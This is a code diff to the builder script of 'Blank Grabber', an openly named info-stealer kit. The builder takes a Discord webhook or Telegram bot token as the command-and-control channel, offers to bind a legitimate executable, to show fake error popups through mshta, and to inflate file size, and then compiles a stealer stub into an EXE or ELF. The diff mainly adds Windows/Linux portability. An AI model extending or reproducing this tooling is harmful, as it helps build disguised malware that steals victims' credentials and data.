@@ -2,7 +2,6 @@ import os
 import subprocess
 import sys
 import json
-import ctypes
 import shutil
 import ast
 import webbrowser
@@ -22,6 +21,10 @@ from PIL import Image
 from io import BytesIO
 from threading import Thread
 
+# Platform detection
+IS_WINDOWS = sys.platform == "win32" or os.name == "nt"
+IS_LINUX = sys.platform.startswith("linux")
+
 class Settings:
 	UpdatesCheck = True
 	Password = "blank123"
@@ -30,23 +33,29 @@ class Utility:
 
 	@staticmethod
 	def ToggleConsole(choice: bool) -> None:
-		if choice and sys.platform == "win32":
-			# Show Console (Windows only)
-			ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
-		elif not choice and sys.platform == "win32":
-			# Hide Console (Windows only)
-			ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+		if IS_WINDOWS:
+			try:
+				import ctypes
+				if choice:
+					# Show Console
+					ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
+				else:
+					# Hide Console
+					ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+			except Exception:
+				pass
 
 	@staticmethod
 	def IsAdmin() -> bool:
-		if sys.platform == "win32":
+		if IS_WINDOWS:
 			try:
+				import ctypes
 				return ctypes.windll.shell32.IsUserAnAdmin() == 1
 			except Exception:
 				return False
-		else:
-			# Linux/Unix check
+		elif IS_LINUX:
 			return os.geteuid() == 0
+		return False
 		
 	@staticmethod
 	def GetSelfDir() -> str:
@@ -74,14 +83,14 @@ class Utility:
 					_hash = json.loads(content)["hash"]
 					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]
 
-					if sys.platform == "win32":
+					if IS_WINDOWS:
 						os.system("cls")
 					else:
 						os.system("clear")
 					return _hash != newhash # New update available
 				except Exception:
 					pass
-			if sys.platform == "win32":
+			if IS_WINDOWS:
 				os.system("cls")
 			else:
 				os.system("clear")
@@ -168,7 +177,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text= "Enter Webhook Here", height= 38, font= self.font, text_color= "white")
 		self.C2EntryControl.grid(row= 0, column= 0, sticky= "ew", padx= (15, 5), columnspan= 5)
 
-		self.testC2ButtonControl = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", text_color_disabled= "grey", command= lambda: Thread(target= self.testC2ButtonControl_Callback, daemon= True).start())
+		self.testC2ButtonControl = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", text_color_disabled= "grey", command= lambda: Thread(target=self.testC2ButtonControl_Callback, daemon=True).start())
 		self.testC2ButtonControl.grid(row= 0, column= 5, sticky= "ew", padx = (5, 15))
 		
 		self.pingMeCheckboxControl = ctk.CTkCheckBox(self, text= "Ping Me", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.pingMeVar)
@@ -246,8 +255,9 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.selectIconButtonControl = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.selectIconButtonControl_Callback)
 		self.selectIconButtonControl.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))
 
-		output_label = "Output: EXE File" if sys.platform == "win32" else "Output: ELF File"
-		self.buildModeButtonControl = ctk.CTkButton(self, text= output_label, height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.buildModeButtonControl_Callback)
+		# Dynamic output button text based on OS
+		output_text = "Output: EXE File" if IS_WINDOWS else "Output: ELF File"
+		self.buildModeButtonControl = ctk.CTkButton(self, text= output_text, height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.buildModeButtonControl_Callback)
 		self.buildModeButtonControl.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))
 
 		self.consoleModeButtonControl = ctk.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.consoleModeButtonControl_Callback)
@@ -294,11 +304,11 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		buttonText = self.bindExeButtonControl.cget("text")
 
 		if buttonText == BIND:
-			if sys.platform == "win32":
+			if IS_WINDOWS:
 				allowedFiletypes = (("Executable file", "*.exe"),)
 			else:
 				allowedFiletypes = (("ELF Executable", "*"),)
-			filePath = ctk.filedialog.askopenfilename(title= "Select file to bind", initialdir= ".", filetypes= allowedFiletypes)
+			filePath = filedialog.askopenfilename(title= "Select file to bind", initialdir= ".", filetypes= allowedFiletypes)
 			if os.path.isfile(filePath):
 				self.boundExePath = filePath
 				self.bindExeButtonControl.configure(text= UNBIND)
@@ -318,7 +328,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		if buttonText == SELECT:
 			allowedFiletypes = (("Image", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"]), ("Any file", "*"))
-			filePath = ctk.filedialog.askopenfilename(title= "Select icon", initialdir= ".", filetypes= allowedFiletypes)
+			filePath = filedialog.askopenfilename(title= "Select icon", initialdir= ".", filetypes= allowedFiletypes)
 			if os.path.isfile(filePath):
 				try:
 					buffer = BytesIO()
@@ -336,11 +346,12 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			self.selectIconButtonControl.configure(text= SELECT)
 	
 	def buildModeButtonControl_Callback(self) -> None:
-		if sys.platform == "win32":
-			BINARYMODE = "Output: EXE File"
+		if IS_WINDOWS:
+			EXEMODE = "Output: EXE File"
+			PYMODE = "Output:   PY File"
 		else:
-			BINARYMODE = "Output: ELF File"
-		PYMODE = "Output:   PY File"
+			EXEMODE = "Output: ELF File"
+			PYMODE = "Output:   PY File"
 
 		exeOnlyChecboxControls = (
 			(self.fakeErrorCheckboxControl, self.fakeErrorVar),
@@ -367,9 +378,9 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			if self.boundExePath:
 				self.bindExeButtonControl_Callback() # Remove bound executable
 
-		else: # Change to Binary mode
+		else: # Change to EXE/ELF mode
 			self.OutputAsExe = True
-			buttonText = BINARYMODE
+			buttonText = EXEMODE
 
 			for control, _ in exeOnlyChecboxControls:
 				control.configure(state= "normal")
@@ -494,7 +505,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		configData = json.dumps(config, indent= 4)
 
 		if self.OutputAsExe:
-			self.master.BuildBinary(configData, self.iconBytes, self.boundExePath)
+			self.master.BuildExecutable(configData, self.iconBytes, self.boundExePath)
 		else:
 			self.master.BuildPythonFile(configData)
 			
@@ -530,7 +541,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 				try:
 					data = json.dumps({"content" : "Your webhook is working!"}).encode()
-					http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit"})
+					http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0"})
 					status = http.status
 					if status == 204:
 						messagebox.showinfo("Success", "Your webhook seems to be working!")
@@ -581,7 +592,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 						try:
 							resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getChat?chat_id=%s" % (token, chat_id)).data.decode())
 							if not resp["ok"]:
-								messagebox.showerror("Error", "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a channel, then add the bot as an admin to the channel.")
+								messagebox.showerror("Error", "Invalid chat ID!")
 								return
 							else:
 								if resp["result"].get("permissions"):
@@ -619,14 +630,13 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 	def fakeError_Event(self) -> None:
 		if not self.fakeErrorVar.get():
 			self.fakeErrorData = [False, ("", "", 0)]
+		elif IS_WINDOWS:
+			fakeErrorBuilder = FakeErrorBuilder(self)
+			self.wait_window(fakeErrorBuilder)
+			self.fakeErrorVar.set(self.fakeErrorData[0])
 		else:
-			if sys.platform == "win32":
-				fakeErrorBuilder = FakeErrorBuilder(self)
-				self.wait_window(fakeErrorBuilder)
-				self.fakeErrorVar.set(self.fakeErrorData[0])
-			else:
-				messagebox.showinfo("Info", "Fake error is only available on Windows")
-				self.fakeErrorVar.set(False)
+			messagebox.showinfo("Info", "Fake error is only available on Windows!")
+			self.fakeErrorVar.set(False)
 	
 	def pumpStub_Event(self) -> None:
 		if not self.pumpStubVar.get():
@@ -642,9 +652,10 @@ class PumperSettings(ctk.CTkToplevel):
 	def __init__(self, master) -> None:
 		super().__init__(master)
 		self.title("Blank Grabber [File Pumper]")
-		icon_path = os.path.join("Extras", "icon.ico")
-		if os.path.isfile(icon_path):
-			self.after(200, lambda: self.iconbitmap(icon_path))
+		try:
+			self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
+		except Exception:
+			pass
 		self.grab_set()
 		self.geometry("500x200")
 		self.resizable(False, False)
@@ -661,7 +672,7 @@ class PumperSettings(ctk.CTkToplevel):
 		self.columnconfigure(1, weight= 1)
 		self.columnconfigure(2, weight= 1)
 
-		noteLabel = ctk.CTkLabel(self, text= "Please specify the pumped output file size (in MB).\n Note: If the size of the stub is already greater than the\n provided size, nothing happens.", font= self.font, text_color= "white")
+		noteLabel = ctk.CTkLabel(self, text= "Please specify the pumped output file size (in MB).\n Note: If the size of the stub is already greater than the\n provided size, nothing happens.", font= self.font)
 		noteLabel.grid(row= 0, column= 0, columnspan= 3, padx= 10)
 
 		limitEntry = ctk.CTkEntry(self, text_color= "white", textvariable= self.limitVar, font= self.font)
@@ -692,9 +703,10 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 	def __init__(self, master) -> None:
 		super().__init__(master)
 		self.title("Blank Grabber [Fake Error Builder]")
-		icon_path = os.path.join("Extras", "icon.ico")
-		if os.path.isfile(icon_path):
-			self.after(200, lambda: self.iconbitmap(icon_path))
+		try:
+			self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
+		except Exception:
+			pass
 		self.grab_set()
 		self.geometry("833x563")
 		self.resizable(True, False)
@@ -741,6 +753,10 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 		self.saveButton.grid(row= 5, column= 2, padx= 20)
 	
 	def testFakeError(self) -> None:
+		if not IS_WINDOWS:
+			messagebox.showinfo("Info", "Fake error feature is only available on Windows!")
+			return
+		
 		title= self.titleEntry.get()
 		message= self.messageEntry.get()
 		icon= self.iconVar.get()
@@ -753,9 +769,12 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 			message= "Message"
 			self.messageEntry.insert(0, message)
 		
-		if sys.platform == "win32":
-			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
+		cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
+		try:
+			import ctypes
 			subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+		except Exception:
+			pass
 	
 	def saveFakeError(self) -> None:
 		title= self.titleEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")
@@ -768,19 +787,11 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 			self.destroy()
 
 		elif title.strip() == "":
-			if sys.platform == "win32":
-				cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Title cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
-				subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-			else:
-				messagebox.showerror("Error", "Title cannot be empty")
+			messagebox.showerror("Error", "Title cannot be empty!")
 			return
 		
 		elif message.strip() == "":
-			if sys.platform == "win32":
-				cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Message cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
-				subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-			else:
-				messagebox.showerror("Error", "Message cannot be empty")
+			messagebox.showerror("Error", "Message cannot be empty!")
 			return
 		
 		self.master.fakeErrorData = [True, (title, message, icon)]
@@ -793,9 +804,10 @@ class Builder(ctk.CTk):
 
 		ctk.set_appearance_mode("dark")
 		self.title("Blank Grabber [Builder]")
-		icon_path = os.path.join("Extras", "icon.ico")
-		if os.path.isfile(icon_path):
-			self.iconbitmap(icon_path)
+		try:
+			self.iconbitmap(os.path.join("Extras", "icon.ico"))
+		except Exception:
+			pass
 		self.geometry("1250x600")
 		self.resizable(False, False)
 
@@ -846,68 +858,69 @@ class Builder(ctk.CTk):
 
 		messagebox.showinfo("Success", "File saved as %r" % outPath)
 	
-	def BuildBinary(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
+	def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
 		def Exit(code: int = 0) -> None:
-			if sys.platform == "win32":
+			if IS_WINDOWS:
 				os.system("pause > NUL")
-			input("Press Enter to exit...")
 			exit(code)
 		
 		def clear() -> None:
-			if sys.platform == "win32":
+			if IS_WINDOWS:
 				os.system("cls")
 			else:
 				os.system("clear")
 		
-		def format_msg(title: str, description: str) -> str:
-			if sys.platform == "win32":
-				return "[{}\u001b[0m] \u001b[37;1m{}\u001b[0m".format(title, description)
-			else:
-				return f"[{title}] {description}"
+		def format(title: str, description: str) -> str:
+			return "[{}\u001b[0m] \u001b[37;1m{}\u001b[0m".format(title, description)
 		
 		self.destroy()
 		Utility.ToggleConsole(True)
-		if sys.platform == "win32":
-			ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
+		if IS_WINDOWS:
+			try:
+				import ctypes
+				ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
+			except Exception:
+				pass
 		clear()
 
-		env_dir = "env"
-		if sys.platform == "win32":
-			activate_script = os.path.join(env_dir, "Scripts", "activate.bat")
-			run_script = os.path.join(env_dir, "Scripts", "run.bat")
+		# Determine environment folder
+		env_dir = os.path.join(os.path.dirname(__file__), "env")
+		if IS_WINDOWS:
+			scripts_dir = os.path.join(env_dir, "Scripts")
+			activate_script = os.path.join(scripts_dir, "activate.bat")
+			run_script = os.path.join(scripts_dir, "run.bat")
 		else:
-			activate_script = os.path.join(env_dir, "bin", "activate")
-			run_script = os.path.join(env_dir, "bin", "run.sh")
+			scripts_dir = os.path.join(env_dir, "bin")
+			activate_script = os.path.join(scripts_dir, "activate")
+			run_script = os.path.join(scripts_dir, "run.sh")
 
 		if not os.path.isfile(run_script):
-			print(format_msg("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
-			res = subprocess.run(f"python3 -m venv {env_dir}" if sys.platform != "win32" else f"python -m venv {env_dir}", capture_output= True, shell= True)
-			clear()
-			if res.returncode != 0:
-				print('Error while creating virtual environment: {}'.format(res.stderr.decode(errors= "ignore")))
-				Exit(1)
+			if not os.path.isfile(activate_script):
+				print(format("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
+				res = subprocess.run("python3 -m venv env" if IS_LINUX else "python -m venv env", capture_output= True, shell= True)
+				clear()
+				if res.returncode != 0:
+					print('Error while creating virtual environment: {}'.format(res.stderr.decode(errors= "ignore")))
+					Exit(1)
 
-		print(format_msg("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
+		print(format("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
 		datadir = os.path.join(os.path.dirname(__file__), "Components")
-		target_dir = os.path.join(os.path.dirname(__file__), env_dir, "Scripts" if sys.platform == "win32" else "bin")
-		
 		for i in os.listdir(datadir):
-			src = os.path.join(datadir, i)
-			dst = os.path.join(target_dir, i)
-			if os.path.isfile(src):
-				shutil.copyfile(src, dst)
+			fileloc = os.path.join(datadir, i)
+			if os.path.isfile(fileloc):
+				shutil.copyfile(fileloc, os.path.join(scripts_dir, i))
 			else:
-				if os.path.exists(dst):
-					shutil.rmtree(dst)
-				shutil.copytree(src, dst)
+				try:
+					shutil.copytree(fileloc, os.path.join(scripts_dir, i))
+				except FileExistsError:
+					pass
 
-		config_path = os.path.join(target_dir, "config.json")
-		with open(config_path, "w", encoding= "utf-8", errors= "ignore") as file:
+		with open(os.path.join(scripts_dir, "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
 			file.write(config)
 
 		clear()
 
-		os.chdir(target_dir)
+		os.chdir(scripts_dir)
 
 		if os.path.isfile("icon.ico"):
 			os.remove("icon.ico")
@@ -916,70 +929,78 @@ class Builder(ctk.CTk):
 			with open("icon.ico", "wb") as file:
 				file.write(iconFileBytes)
 
-		if os.path.isfile("bound"):
-			os.remove("bound")
-
-		if os.path.isfile(boundFilePath):
-			if sys.platform == "win32":
+		if IS_WINDOWS:
+			if os.path.isfile("bound.exe"):
+				os.remove("bound.exe")
+			if os.path.isfile(boundFilePath):
 				shutil.copy(boundFilePath, "bound.exe")
-			else:
-				shutil.copy(boundFilePath, "bound")
-
-		# Create run script for Linux if needed
-		if sys.platform != "win32" and not os.path.isfile(run_script):
-			with open(run_script, "w") as f:
-				f.write("#!/bin/bash\n")
-				f.write("python3 stub.py\n")
-			os.chmod(run_script, 0o755)
-
-		if sys.platform == "win32":
 			os.startfile("run.bat")
 		else:
-			subprocess.Popen(["bash", run_script])
+			if os.path.isfile("bound.elf"):
+				os.remove("bound.elf")
+			if os.path.isfile(boundFilePath):
+				shutil.copy(boundFilePath, "bound.elf")
+			os.system("chmod +x run.sh && ./run.sh")
 
 if __name__ == "__main__":
 
-	if os.name == "nt" or sys.platform.startswith("linux"):
+	if IS_WINDOWS:
 		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
-			if sys.platform == "win32":
+			try:
+				import ctypes
 				subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Components folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True)
-			else:
-				print("Error: Components folder cannot be found. Please redownload the files!")
+			except Exception:
+				pass
 			exit(1)
 		
 		version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
 		if not (parse_version(version) > parse_version("3.10")):
-			if sys.platform == "win32":
-				subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.10+ is required. Please update your Python installation!\', 10, \'Error\', 16);close()"', shell= True)
-			else:
-				print(f"Error: Your Python version is {version} but version 3.10+ is required!")
+			try:
+				import ctypes
+				subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.10+ is required. Please update your Python installation from https://www.python.org/downloads/\', 10, \'Error\', 16);close()"', shell= True)
+			except Exception:
+				pass
 			exit(1)
-		
-		if sys.platform == "win32":
-			if "windowsapps" in sys.executable.lower():
-				subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://www.python.org/downloads/\', 10, \'Error\', 16);close()"', shell= True)
-				exit(1)
+		if "windowsapps" in sys.executable.lower():
+			try:
+				import ctypes
+				subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://www.python.org/downloads/. Please reinstall Python properly!\', 10, \'Error\', 16);close()"', shell= True)
+			except Exception:
+				pass
+			exit(1)
 
-			Utility.CheckConfiguration()
-			
-			if Utility.CheckForUpdates():
-				response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (https://github.com/Blank-c/Blank-Grabber)")
-				if response:
-					webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
-					exit(0)
+		Utility.CheckConfiguration()
 		
-			# Do not hide console so it can show if there is any error
-			# Utility.ToggleConsole(False)
-			
+		if Utility.CheckForUpdates():
+			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app?")
+			if response:
+				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
+				exit(0)
+	
+		# Do not hide console so it can show if there is any error
+		# Utility.ToggleConsole(False)
+		
+		try:
+			import ctypes
 			if not Utility.IsAdmin():
 				ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 				exit(0)
-		else:
-			# Linux checks
-			if os.geteuid() != 0:
-				print("Warning: This tool should be run with root/sudo privileges for full functionality!")
+		except Exception:
+			pass
 		
 		Builder().mainloop()
 
+	elif IS_LINUX:
+		Utility.CheckConfiguration()
+		
+		if Utility.CheckForUpdates():
+			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app?")
+			if response:
+				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
+				exit(0)
+		
+		Builder().mainloop()
+	
 	else:
 		print("Only Windows and Linux OS are supported!")
+		
